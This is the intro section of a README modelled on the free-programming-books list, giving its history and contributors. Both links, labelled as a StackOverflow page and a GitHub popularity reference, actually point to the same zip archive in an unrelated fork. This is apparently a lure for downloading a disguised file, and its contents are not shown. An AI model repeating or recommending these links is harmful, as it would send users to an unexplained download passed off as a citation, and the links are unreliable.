## Intro

This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://github.com/dmqin/free-programming-books/raw/refs/heads/main/courses/programming-free-books-3.9.zip) with contributions from Karan Bhangui and George Stocker.

The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://github.com/dmqin/free-programming-books/raw/refs/heads/main/courses/programming-free-books-3.9.zip).
